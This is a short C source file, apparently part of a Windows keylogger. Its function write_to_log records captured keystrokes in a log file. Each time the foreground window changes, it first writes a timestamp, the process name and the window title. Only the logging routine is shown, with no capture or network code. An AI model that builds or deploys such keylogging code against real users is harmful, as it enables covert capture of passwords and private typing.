#include "winkey.h"

void write_to_log(const char* str)
{
    // Check if the foreground window has changed since the last logged window
    if (g_foreground_window != g_last_window) {
        // Update the last window to the current foreground window
        g_last_window = g_foreground_window;

        // Get the current time
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        // Write a new entry to the log file with the timestamp, process name, and window title
        fprintf(g_logfile, "\n>>> %04d-%02d-%02d %02d:%02d:%02d (%s) %s\n",
            tm.tm_year + 1900,   // Year (add 1900 to get the full year)
            tm.tm_mon + 1,       // Month (tm_mon is 0-based, so add 1)
            tm.tm_mday,          // Day of the month
            tm.tm_hour,          // Hour
            tm.tm_min,           // Minute
            tm.tm_sec,           // Second
            g_process_name,      // Name of the current foreground process
            g_window_title);     // Title of the current foreground window
    }

    // Log the key or string that was captured
    fprintf(g_logfile, "%s", str);

    // Ensure all data is written to the file immediately
    fflush(g_logfile);
}
